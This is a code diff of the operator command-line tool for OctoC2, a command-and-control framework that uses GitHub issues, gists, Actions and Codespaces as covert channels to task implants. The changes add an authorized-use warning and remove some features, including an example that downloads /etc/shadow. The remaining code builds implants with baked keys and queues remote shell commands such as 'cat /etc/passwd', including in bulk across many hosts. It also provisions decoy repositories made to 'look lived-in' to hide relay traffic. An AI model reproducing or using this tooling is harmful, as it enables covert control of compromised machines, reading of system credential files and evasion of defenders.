@@ -7,29 +7,26 @@
  *   beacons                        — list registered beacons
  *   task <beaconId> --kind <kind>  — queue a task for a beacon
  *   results <beaconId>             — show decrypted task results
- *   module build <name>            — compile and upload a module binary
  *   build-beacon                   — compile implant with baked keypair
- *   drop create                    — create encrypted dead-drop gist
- *   drop list                      — search for existing dead-drops
- *   proxy create <owner/repo>      — print proxy repo workflow templates
+ *   drop create                    — create a signed deterministic recovery record
+ *   drop list                      — inspect the deterministic recovery path
+ *   proxy create                   — provision a two-repository relay
  *   proxy list                     — show configured proxy repos
- *   proxy rotate <beaconId> <json> — print dead-drop payload for proxy rotation
+ *   proxy rotate <beaconId> <json> — print signed-recovery policy fragments
  *
  * Environment (all commands except keygen):
- *   OCTOC2_GITHUB_TOKEN   — GitHub PAT (repo scope)
- *   OCTOC2_REPO_OWNER     — org/user owning the C2 repo
- *   OCTOC2_REPO_NAME      — C2 repository name
- *   OCTOC2_OPERATOR_SECRET — base64url X25519 secret key
- *   MONITORING_PUBKEY — base64url X25519 public key (or GitHub Variable)
- *   OCTOC2_DATA_DIR       — server data directory (default: ./data)
+ *   OCTOC2_OPERATOR_API_TOKEN    — operator-only controller API credential
+ *   OCTOC2_OPERATOR_GITHUB_TOKEN — operator-only direct GitHub credential
+ *   OCTOC2_REPO_OWNER / OCTOC2_REPO_NAME — controller repository
+ *   OCTOC2_OPERATOR_SECRET       — base64url X25519 result-decryption key
+ *   OCTOC2_DATA_DIR              — server data directory (default: ./data)
  */
 
 import { Command } from "commander";
 import { runKeygen }  from "./commands/keygen.ts";
 import { runBeacons } from "./commands/beacons.ts";
-import { runTask, type TaskKind }    from "./commands/task.ts";
+import { runTask }    from "./commands/task.ts";
 import { runResults } from "./commands/results.ts";
-import { runModuleBuild } from "./commands/module.ts";
 import { runBuildBeacon, type BuildBeaconOptions } from "./commands/buildBeacon.ts";
 import { runBuildBeaconSimple } from "./commands/buildBeaconSimple.ts";
 import { runDropCreate, runDropList }               from "./commands/drop.ts";
@@ -39,21 +36,26 @@ import { runBeaconShell }  from "./commands/beaconShell.ts";
 import { runBulkShell }    from "./commands/bulkShell.ts";
 import { runSetup }        from "./commands/setup.ts";
 import { runStart, runStop, runStatus } from "./commands/service.ts";
+import { TASK_KINDS, isTaskKind } from "@octoc2/shared";
 
 const program = new Command();
 
 program
   .name("octoctl")
-  .description("OctoC2 operator CLI")
+  .description("EXPERIMENTAL / NON-PRODUCTION OctoC2 operator CLI")
   .version("0.1.0")
+  .addHelpText("before", `
+WARNING: OctoC2 is experimental and not production-ready.
+Use only in isolated environments that you own or are explicitly authorized to test.
+`)
   .addHelpText("after", `
 Environment variables:
-  OCTOC2_GITHUB_TOKEN    GitHub PAT with repo scope
-  OCTOC2_REPO_OWNER      org/user owning the C2 repo
-  OCTOC2_REPO_NAME       C2 repository name
-  OCTOC2_OPERATOR_SECRET base64url X25519 secret key (server + octoctl, keep secret)
-  MONITORING_PUBKEY base64url X25519 public key (or set as GitHub repo Variable)
-  OCTOC2_DATA_DIR        server data directory (default: ./data)
+  OCTOC2_OPERATOR_API_TOKEN    operator-only controller API credential
+  OCTOC2_OPERATOR_GITHUB_TOKEN operator-only direct GitHub credential
+  OCTOC2_REPO_OWNER            controller repository owner
+  OCTOC2_REPO_NAME             controller repository name
+  OCTOC2_OPERATOR_SECRET       base64url X25519 result-decryption key
+  OCTOC2_DATA_DIR              server data directory (default: ./data)
 `);
 
 // ── keygen ────────────────────────────────────────────────────────────────────
@@ -90,11 +92,9 @@ program
 
 program
   .command("task <beaconId>")
-  .description("Queue a task for a beacon (posts encrypted deploy comment to GitHub)")
-  .requiredOption("--kind <kind>",       "task kind: shell|upload|download|screenshot|keylog|persist|unpersist|sleep|die|load-module")
+  .description("Queue a durable task through the authenticated controller API")
+  .requiredOption("--kind <kind>",       `task kind: ${TASK_KINDS.join("|")}`)
   .option("--cmd <cmd>",                 "shell command to execute  (kind=shell)")
-  .option("--local-path <path>",         "local file path           (kind=upload)")
-  .option("--remote-path <path>",        "remote file path          (kind=download|upload)")
   .option("--seconds <n>",               "sleep duration in seconds (kind=sleep)")
   .option("--args-json <json>",          "raw task args as JSON string (advanced)")
   .option("--tentacle <kind>",           "force delivery via specific channel: issues|branch|actions|proxy|codespaces|relay|gist|oidc|notes|secrets|pages|stego")
@@ -102,9 +102,9 @@ program
 Examples:
   octoctl task abc123 --kind shell --cmd "id"
   octoctl task abc123 --kind shell --cmd "cat /etc/passwd"
-  octoctl task abc123 --kind download --remote-path /etc/shadow
+  octoctl task abc123 --kind exec --args-json '{"cmd":"id","args":["-u"]}'
   octoctl task abc123 --kind sleep --seconds 300
-  octoctl task abc123 --kind die
+  octoctl task abc123 --kind kill
   octoctl task abc123 --kind shell --cmd "whoami" --tentacle notes
   octoctl task abc123 --kind shell --cmd "id" --tentacle gist
 `)
@@ -113,18 +113,19 @@ Examples:
     opts: {
       kind:        string;
       cmd?:        string;
-      localPath?:  string;
-      remotePath?: string;
       seconds?:    string;
       argsJson?:   string;
       tentacle?:   string;
     }
   ) => {
+    if (!isTaskKind(opts.kind)) {
+      throw new Error(
+        `Unsupported task kind '${opts.kind}'. Valid kinds: ${TASK_KINDS.join(", ")}`,
+      );
+    }
     await runTask(beaconId, {
-      kind:       opts.kind as TaskKind,
+      kind:       opts.kind,
       cmd:        opts.cmd,
-      localPath:  opts.localPath,
-      remotePath: opts.remotePath,
       seconds:    opts.seconds !== undefined ? parseInt(opts.seconds, 10) : undefined,
       argsJson:   opts.argsJson,
       tentacle:   opts.tentacle,
@@ -135,7 +136,7 @@ Examples:
 
 program
   .command("results <beaconId>")
-  .description("Fetch and decrypt task results from a beacon's GitHub issue")
+  .description("Fetch verified, durable task results from the controller API")
   .option("--last <n>",       "show last N results")
   .option("--since <time>",   "time window: 30m | 2h | 1d | ISO-8601 (default: 24h)")
   .option("--json",           "output raw JSON", false)
@@ -157,46 +158,6 @@ Examples:
     }).catch(fatal);
   });
 
-// ── module ────────────────────────────────────────────────────────────────────
-
-const moduleCmd = program
-  .command("module")
-  .description("Manage OctoModules — per-beacon compiled capability binaries");
-
-moduleCmd
-  .command("build <name>")
-  .description("Compile and upload a module binary for a specific beacon")
-  .requiredOption("--beacon <beaconId>",  "target beacon ID (prefix match)")
-  .requiredOption("--source <path>",      "path to the Bun source file to compile")
-  .option("--server-url <url>",           "C2 server URL (overrides OCTOC2_SERVER_URL)")
-  .addHelpText("after", `
-Examples:
-  # Recon module — collects hostname, whoami, uname
-  octoctl module build recon --beacon abc123 --source ./modules/recon.ts --server-url https://myserver:8080
-
-  # Screenshot stub (not yet implemented)
-  octoctl module build screenshot --beacon abc123 --source ./modules/screenshot.ts --server-url https://myserver:8080
-
-  # Persist stub (not yet implemented)
-  octoctl module build persist --beacon abc123 --source ./modules/persist.ts --server-url https://myserver:8080
-
-  # Using OCTOC2_SERVER_URL env var instead of --server-url
-  OCTOC2_SERVER_URL=https://myserver:8080 octoctl module build recon --beacon abc123 --source ./modules/recon.ts
-
-After building, queue the module for execution on the beacon:
-  octoctl task abc123 --kind load-module --args-json '{"name":"recon","serverUrl":"https://myserver:8080"}'
-`)
-  .action(async (
-    name: string,
-    opts: { beacon: string; source: string; serverUrl?: string }
-  ) => {
-    await runModuleBuild(name, {
-      beacon:    opts.beacon,
-      source:    opts.source,
-      serverUrl: opts.serverUrl,
-    }).catch(fatal);
-  });
-
 // ── build-beacon ──────────────────────────────────────────────────────────────
 
 program
@@ -210,12 +171,10 @@ program
   .option("--relay <account/repo>",      "relay consortium entry (repeatable)", (v: string, acc: string[]) => [...acc, v], [] as string[])
   .option("--target <target>",           "bun compile target (full mode, default: bun-linux-x64)")
   .option("--no-random-title",           "disable random issue title (uses default format)")
-  .option("--app-id <n>",                "bake GitHub App ID as SVC_APP_ID (not secret)")
-  .option("--installation-id <n>",       "bake installation ID as SVC_INSTALLATION_ID")
-  .option("--codespace-name <name>",     "bake Codespace name (SVC_GRPC_CODESPACE_NAME) — enables stealth gRPC bootstrap")
+  .option("--codespace-name <name>",     "bake non-secret Codespace name (SVC_GRPC_CODESPACE_NAME)")
   .option("--github-user <user>",        "bake GitHub username for Codespace SSH auth (SVC_GITHUB_USER)")
   .option("--tentacle-priority <list>",  "bake tentacle priority order (SVC_TENTACLE_PRIORITY), e.g. codespaces,issues")
-  .option("--grpc-url <url>",            "bake public gRPC URL (SVC_GRPC_DIRECT), e.g. https://name-50051.app.github.dev")
+  .option("--grpc-url <url>",            "bake direct TLS gRPC endpoint (SVC_GRPC_DIRECT); hostname must match certificate SAN")
   .option("--http-url <url>",            "base HTTP URL to bake in (SVC_HTTP_URL). e.g. https://codespace-8080.app.github.dev")
   .addHelpText("after", `
 Examples:
@@ -226,15 +185,13 @@ Examples:
   octoctl build-beacon --outfile ./implant-abc123
   octoctl build-beacon --outfile ./implant-abc123 --relay relay1/relay-repo --relay relay2/relay-repo2
   octoctl build-beacon --outfile ./implant-abc123 --no-random-title
-  # Bake App ID + installation ID; deliver private key separately via dead-drop
-  octoctl build-beacon --outfile ./implant-abc123 --app-id 123456 --installation-id 987654
-  # Bake public Codespace gRPC URL — beacon skips GitHub Issues entirely
-  octoctl build-beacon --outfile ./implant-abc123 --grpc-url https://name-50051.app.github.dev --tentacle-priority codespaces,issues
+  # Bake a direct TLS gRPC endpoint whose hostname is present in the server certificate SAN
+  octoctl build-beacon --outfile ./implant-abc123 --grpc-url grpc.example.test:50051 --tentacle-priority codespaces,issues
 `)
   .action(async (opts: {
     output?: string; outfile?: string; platform?: string;
     beaconId?: string; source: string; relay: string[];
-    target?: string; randomTitle: boolean; appId?: string; installationId?: string;
+    target?: string; randomTitle: boolean;
     codespaceName?: string; githubUser?: string; tentaclePriority?: string; grpcUrl?: string; httpUrl?: string;
   }) => {
     // Simple mode: --output (or --output + --platform) — no key baking, just bun build
@@ -252,9 +209,6 @@ Examples:
       process.exit(1);
     }
 
-    // Env-var fallbacks — App tokens used by default when env vars set
-    const appId          = opts.appId          ?? process.env["SVC_APP_ID"];
-    const installationId = opts.installationId  ?? process.env["SVC_INSTALLATION_ID"];
     await runBuildBeacon({
       outfile: opts.outfile,
       ...(opts.beaconId    !== undefined && { beaconId:    opts.beaconId }),
@@ -262,8 +216,6 @@ Examples:
       relay:   opts.relay,
       target:  opts.target ?? "bun-linux-x64",
       randomTitle: opts.randomTitle,
-      ...(appId          !== undefined && { appId:          parseInt(appId, 10) }),
-      ...(installationId !== undefined && { installationId: parseInt(installationId, 10) }),
       ...(opts.codespaceName    !== undefined && { codespaceName:    opts.codespaceName }),
       ...(opts.githubUser       !== undefined && { githubUser:       opts.githubUser }),
       ...(opts.tentaclePriority !== undefined && { tentaclePriority: opts.tentaclePriority }),
@@ -280,58 +232,66 @@ const dropCmd = program
 
 dropCmd
   .command("create")
-  .description("Create an encrypted dead-drop gist for a beacon")
+  .description("Publish a signed, sealed deterministic recovery record")
   .requiredOption("--beacon <id-prefix>",      "target beacon ID (prefix match)")
-  .option("--server-url <url>",                "new C2 server URL to bake into drop")
-  .option("--new-token <pat>",                 "replacement GitHub PAT (if rotating token)")
-  .option("--tentacle-priority <p1,p2,...>",   "new tentacle priority (e.g. notes,issues)")
-  .option("--app-id <n>",                      "GitHub App ID (numeric) — include to migrate beacon to App auth")
-  .option("--installation-id <n>",             "GitHub App installation ID for the C2 repo")
-  .option("--app-key-file <path>",             "path to GitHub App private key PEM (for App auth rotation)")
-  .option("--key-type <type>",                 "key type: 'app' (GitHub App PEM) or 'monitoring' (operator pubkey rotation)")
-  .option("--monitoring-pubkey <pubkey>",      "new operator public key (base64url) for monitoring key rotation")
+  .requiredOption("--configuration-file <path>", "complete recovery configuration JSON")
+  .requiredOption("--generation <n>",          "monotonic recovery generation")
+  .requiredOption("--recovery-signing-secret-file <path>", "base64url Ed25519 recovery secret-key file")
+  .option("--recovery-signing-public-key <key>", "current recovery Ed25519 public key")
+  .option("--recovery-signing-key-id <id>",    "current recovery signing key ID")
+  .option("--recovery-owner <owner>",          "dedicated public recovery repository owner")
+  .option("--recovery-repo <repo>",            "dedicated public recovery repository name")
+  .option("--recovery-ref <ref>",              "recovery repository ref", "main")
+  .option("--writer-token <token>",            "dedicated recovery repository write token")
+  .option("--issued-at <time>",                "canonical issuance timestamp (defaults to now)")
+  .option("--expires-at <time>",               "record expiry (defaults to lease expiry)")
   .option("--data-dir <dir>",                  "server data directory (overrides OCTOC2_DATA_DIR)")
-  .addHelpText("after", `
-Examples:
-  octoctl drop create --beacon abc123 --server-url https://backup-c2:8080
-  octoctl drop create --beacon abc123 --server-url https://backup-c2:8080 --tentacle-priority notes,issues
-  # Rotate App private key without changing C2 URL:
-  octoctl drop create --beacon abc123 --app-key-file ~/.config/svc/new-app-key.pem
-  # Migrate running beacon from PAT → GitHub App auth:
-  octoctl drop create --beacon abc123 --app-id 123456 --installation-id 987654 --app-key-file ~/.config/svc/app-key.pem
-  # Rotate operator monitoring pubkey (X25519):
-  octoctl drop create --beacon abc123 --key-type monitoring --monitoring-pubkey <base64url-pubkey>
-  # Explicit app key rotation with --key-type:
-  octoctl drop create --beacon abc123 --key-type app --app-key-file ~/.config/svc/new-app-key.pem
-`)
   .action(async (opts: {
-    beacon: string; serverUrl?: string; newToken?: string;
-    tentaclePriority?: string; appId?: string; installationId?: string;
-    appKeyFile?: string; keyType?: string; monitoringPubkey?: string; dataDir?: string;
+    beacon: string; configurationFile: string; generation: string;
+    recoverySigningSecretFile: string; recoverySigningPublicKey?: string;
+    recoverySigningKeyId?: string; recoveryOwner?: string; recoveryRepo?: string;
+    recoveryRef: string; writerToken?: string; issuedAt?: string;
+    expiresAt?: string; dataDir?: string;
   }) => {
     await runDropCreate({
       beacon: opts.beacon,
-      ...(opts.serverUrl        !== undefined && { serverUrl:        opts.serverUrl }),
-      ...(opts.newToken         !== undefined && { newToken:         opts.newToken }),
-      ...(opts.tentaclePriority !== undefined && { tentaclePriority: opts.tentaclePriority }),
-      ...(opts.appId            !== undefined && { appId:            parseInt(opts.appId, 10) }),
-      ...(opts.installationId   !== undefined && { installationId:   parseInt(opts.installationId, 10) }),
-      ...(opts.appKeyFile       !== undefined && { appKeyFile:       opts.appKeyFile }),
-      ...(opts.keyType          !== undefined && { keyType:          opts.keyType as 'app' | 'monitoring' }),
-      ...(opts.monitoringPubkey !== undefined && { monitoringPubkey: opts.monitoringPubkey }),
+      configurationFile: opts.configurationFile,
+      generation: parseInt(opts.generation, 10),
+      recoverySigningSecretFile: opts.recoverySigningSecretFile,
+      ...(opts.recoverySigningPublicKey !== undefined && {
+        recoverySigningPublicKey: opts.recoverySigningPublicKey,
+      }),
+      ...(opts.recoverySigningKeyId !== undefined && {
+        recoverySigningKeyId: opts.recoverySigningKeyId,
+      }),
+      ...(opts.recoveryOwner !== undefined && { recoveryOwner: opts.recoveryOwner }),
+      ...(opts.recoveryRepo !== undefined && { recoveryRepo: opts.recoveryRepo }),
+      recoveryRef: opts.recoveryRef,
+      ...(opts.writerToken !== undefined && { writerToken: opts.writerToken }),
+      ...(opts.issuedAt !== undefined && { issuedAt: opts.issuedAt }),
+      ...(opts.expiresAt !== undefined && { expiresAt: opts.expiresAt }),
       ...(opts.dataDir          !== undefined && { dataDir:          opts.dataDir }),
     }).catch(fatal);
   });
 
 dropCmd
   .command("list")
-  .description("Search GitHub for existing dead-drops for a beacon")
+  .description("Inspect the deterministic recovery path for a beacon")
   .requiredOption("--beacon <id-prefix>", "target beacon ID (prefix match)")
+  .option("--recovery-owner <owner>",      "dedicated recovery repository owner")
+  .option("--recovery-repo <repo>",        "dedicated recovery repository name")
+  .option("--recovery-ref <ref>",          "recovery repository ref", "main")
   .option("--data-dir <dir>",             "server data directory (overrides OCTOC2_DATA_DIR)")
-  .action(async (opts: { beacon: string; dataDir?: string }) => {
+  .action(async (opts: {
+    beacon: string; dataDir?: string; recoveryOwner?: string;
+    recoveryRepo?: string; recoveryRef: string;
+  }) => {
     await runDropList({
       beacon: opts.beacon,
       ...(opts.dataDir !== undefined && { dataDir: opts.dataDir }),
+      ...(opts.recoveryOwner !== undefined && { recoveryOwner: opts.recoveryOwner }),
+      ...(opts.recoveryRepo !== undefined && { recoveryRepo: opts.recoveryRepo }),
+      recoveryRef: opts.recoveryRef,
     }).catch(fatal);
   });
 
@@ -343,32 +303,30 @@ const proxyCmd = program
 
 proxyCmd
   .command("create")
-  .description("Provision a decoy repo as an OctoProxy relay for a beacon")
+  .description("Provision distinct decoy/control repositories as a signed relay")
   .requiredOption("--decoy-repo <owner/repo>",  "decoy repository (owner/repo)")
   .requiredOption("--beacon <id>",              "beacon ID (prefix match)")
-  .requiredOption("--ctrl-token <pat>",         "PAT with actions:write on the control repo")
+  .option("--control-dispatch-token <token>",   "scoped credential for dispatching the control repo (or OCTOC2_PROXY_CONTROL_DISPATCH_TOKEN)")
+  .option("--target-dispatch-token <token>",    "stable control egress credential authorized for all decoy repos (or OCTOC2_PROXY_TARGET_DISPATCH_TOKEN)")
   .option("--ctrl-owner <owner>",               "control repo owner (default: OCTOC2_CTRL_OWNER env)")
   .option("--ctrl-repo <name>",                 "control repo name (default: OCTOC2_CTRL_REPO env)")
-  .option("--proxy-token <pat>",                "restricted PAT for beacon use on decoy repo")
-  .option("--inner-kind <kind>",                "issues | notes (default: issues)", "issues")
+  .option("--proxy-installation-id <id>",       "GitHub App installation containing the decoy repo (or OCTOC2_PROXY_INSTALLATION_ID)")
   .option("--issue-title <text>",               "title for the proxy issue", "Dependency audit: review pinned versions")
   .option("--create-repo",                      "create the decoy GitHub repo first", false)
   .option("--scaffold",                         "add README + .gitignore to make repo look lived-in", false)
   .option("--data-dir <dir>",                   "server data directory (overrides OCTOC2_DATA_DIR)")
-  .option("--app-id <id>",                      "GitHub App ID for beacon proxy auth")
-  .option("--installation-id <id>",             "GitHub App installation ID for beacon proxy auth")
-  .option("--app-private-key <pem>",            "GitHub App private key (PEM) for beacon proxy auth")
   .addHelpText("after", `
 Examples:
-  octoctl proxy create --decoy-repo acme/infra-utils --beacon abc123 --ctrl-token github_pat_...
-  octoctl proxy create --decoy-repo acme/infra-utils --beacon abc123 --ctrl-token github_pat_... --create-repo --scaffold
+  Set OCTOC2_PROXY_CONTROL_DISPATCH_TOKEN, OCTOC2_PROXY_TARGET_DISPATCH_TOKEN,
+  and the stable OCTOC2_PROXY_RELAY_SIGNING_KEY, then run:
+  octoctl proxy create --decoy-repo acme/infra-utils --beacon abc123 --proxy-installation-id 12345
 `)
   .action(async (opts: {
-    decoyRepo: string; beacon: string; ctrlToken: string;
-    ctrlOwner?: string; ctrlRepo?: string; proxyToken?: string;
-    innerKind: string; issueTitle: string; createRepo: boolean;
+    decoyRepo: string; beacon: string;
+    controlDispatchToken?: string; targetDispatchToken?: string;
+    ctrlOwner?: string; ctrlRepo?: string; proxyInstallationId?: string;
+    issueTitle: string; createRepo: boolean;
     scaffold: boolean; dataDir?: string;
-    appId?: string; installationId?: string; appPrivateKey?: string;
   }) => {
     const [decoyOwner, decoyRepoName] = opts.decoyRepo.split("/");
     if (!decoyOwner || !decoyRepoName) {
@@ -379,52 +337,74 @@ Examples:
     const ctrlRepo  = opts.ctrlRepo  ?? process.env["OCTOC2_CTRL_REPO"];
     if (!ctrlOwner) { console.error("\n  Error: --ctrl-owner or OCTOC2_CTRL_OWNER required\n"); process.exit(1); }
     if (!ctrlRepo)  { console.error("\n  Error: --ctrl-repo or OCTOC2_CTRL_REPO required\n");  process.exit(1); }
-    // Env-var fallbacks — App tokens used by default when env vars set
-    const appId         = opts.appId         ?? process.env["SVC_APP_ID"];
-    const installationId = opts.installationId ?? process.env["SVC_INSTALLATION_ID"];
-    const appPrivateKey  = opts.appPrivateKey  ?? process.env["OCTOC2_APP_PRIVATE_KEY"];
+    const controlDispatchToken =
+      opts.controlDispatchToken ??
+      process.env["OCTOC2_PROXY_CONTROL_DISPATCH_TOKEN"];
+    const targetDispatchToken =
+      opts.targetDispatchToken ??
+      process.env["OCTOC2_PROXY_TARGET_DISPATCH_TOKEN"];
+    const relaySigningKey =
+      process.env["OCTOC2_PROXY_RELAY_SIGNING_KEY"];
+    const installationRaw =
+      opts.proxyInstallationId ??
+      process.env["OCTOC2_PROXY_INSTALLATION_ID"];
+    if (!controlDispatchToken) {
+      console.error("\n  Error: control dispatch credential is required\n");
+      process.exit(1);
+    }
+    if (!targetDispatchToken) {
+      console.error("\n  Error: target dispatch credential is required\n");
+      process.exit(1);
+    }
+    if (!relaySigningKey) {
+      console.error("\n  Error: OCTOC2_PROXY_RELAY_SIGNING_KEY is required\n");
+      process.exit(1);
+    }
+    const proxyInstallationId = Number(installationRaw);
+    if (!Number.isSafeInteger(proxyInstallationId) || proxyInstallationId <= 0) {
+      console.error("\n  Error: a positive --proxy-installation-id is required\n");
+      process.exit(1);
+    }
     await proxyProvision({
       decoyOwner, decoyRepo: decoyRepoName,
-      beaconId:  opts.beacon,
-      ctrlToken: opts.ctrlToken, ctrlOwner, ctrlRepo,
-      ...(opts.proxyToken && { proxyToken: opts.proxyToken }),
-      innerKind:  opts.innerKind as "issues" | "notes",
+      beaconId: opts.beacon,
+      controlDispatchToken,
+      targetDispatchToken,
+      relaySigningKey,
+      ctrlOwner,
+      ctrlRepo,
+      proxyInstallationId,
+      innerKind:  "issues",
       issueTitle: opts.issueTitle,
       createRepo: opts.createRepo,
       scaffold:   opts.scaffold,
       ...(opts.dataDir && { dataDir: opts.dataDir }),
-      ...(appId && installationId && appPrivateKey && {
-        appId,
-        installationId,
-        appPrivateKey,
-      }),
     }).catch(fatal);
   });
 
 proxyCmd
   .command("templates")
   .description("Print the OctoProxy workflow YAML templates (for manual setup)")
-  .option("--inner-kind <kind>", "issues | notes", "issues")
-  .action(async (opts: { innerKind: string }) => {
+  .action(async () => {
     await proxyCreate({
       owner: "your-org", repo: "your-decoy-repo",
-      innerKind: opts.innerKind as "issues" | "notes"
+      innerKind: "issues",
     }).catch(fatal);
   });
 
 proxyCmd
   .command("list")
-  .description("Show proxy repos configured via SVC_PROXY_REPOS env var")
+  .description("Show proxy routes from OCTOC2_RECOVERY_POLICIES")
   .action(async () => {
     await proxyList().catch(fatal);
   });
 
 proxyCmd
   .command("rotate <beaconId> <newProxyRepos>")
-  .description("Print a dead-drop payload to update proxy repos for a beacon")
+  .description("Print server policy fragments for the next signed recovery record")
   .addHelpText("after", `
 Examples:
-  octoctl proxy rotate abc123 '[{"owner":"acme","repo":"decoy","innerKind":"issues"}]'
+  octoctl proxy rotate abc123 '[{"owner":"acme","repo":"decoy","innerKind":"issues","decoyIssue":7}]'
 `)
   .action(async (beaconId: string, newProxyRepos: string) => {
     await proxyRotate({ beaconId, newProxyRepos }).catch(fatal);
@@ -445,8 +425,8 @@ beaconCmd
   .option("--timeout <seconds>",         "max wait per command in seconds", "300")
   .addHelpText("after", `
 Examples:
-  OCTOC2_SERVER_URL=http://localhost:8080 octoctl beacon shell --beacon abc123
-  OCTOC2_SERVER_URL=http://localhost:8080 octoctl beacon shell --beacon abc123 --tentacle notes
+  OCTOC2_SERVER_URL=https://localhost:8080 octoctl beacon shell --beacon abc123
+  OCTOC2_SERVER_URL=https://localhost:8080 octoctl beacon shell --beacon abc123 --tentacle notes
 `)
   .action(async (opts: { beacon: string; tentacle?: string; serverUrl?: string; timeout?: string }) => {
     await runBeaconShell({
@@ -475,7 +455,7 @@ tentaclesCmd
 Examples:
   octoctl tentacles list --beacon abc123
   octoctl tentacles list --beacon abc123 --json
-  octoctl tentacles list --beacon abc123 --server-url http://localhost:8080
+  octoctl tentacles list --beacon abc123 --server-url https://localhost:8080
   octoctl tentacles list --beacon abc123 --verbose
 `)
   .action(async (opts: { beacon: string; json: boolean; verbose: boolean; serverUrl?: string; dataDir?: string }) => {
@@ -500,7 +480,7 @@ tentaclesCmd
 Examples:
   octoctl tentacles health --beacon abc123
   octoctl tentacles health --beacon abc123 --json
-  octoctl tentacles health --beacon abc123 --server-url http://localhost:8080
+  octoctl tentacles health --beacon abc123 --server-url https://localhost:8080
   octoctl tentacles health --beacon abc123 --verbose
 `)
   .action(async (opts: { beacon: string; json: boolean; verbose: boolean; serverUrl?: string; dataDir?: string }) => {
@@ -525,14 +505,14 @@ bulkCmd
   .requiredOption("--beacon-ids <ids>",  "comma-separated beacon IDs")
   .requiredOption("--cmd <command>",     "shell command to queue on each beacon")
   .option("--server-url <url>",          "C2 server URL (overrides OCTOC2_SERVER_URL)")
-  .option("--token <token>",             "bearer token (overrides OCTOC2_DASHBOARD_TOKEN)")
+  .option("--token <token>",             "operator API token (overrides OCTOC2_OPERATOR_API_TOKEN)")
   .option("--json",                      "output raw JSON", false)
   .option("--wait",                      "poll each beacon for results after queueing", false)
   .option("--timeout <seconds>",         "seconds to wait for results when --wait is set (default 60)", "60")
   .addHelpText("after", `
 Examples:
   octoctl bulk shell --beacon-ids abc123,def456,ghi789 --cmd "whoami"
-  OCTOC2_SERVER_URL=http://localhost:8080 octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --json
+  OCTOC2_SERVER_URL=https://localhost:8080 octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --json
   octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --wait
   octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --wait --timeout 120
 `)
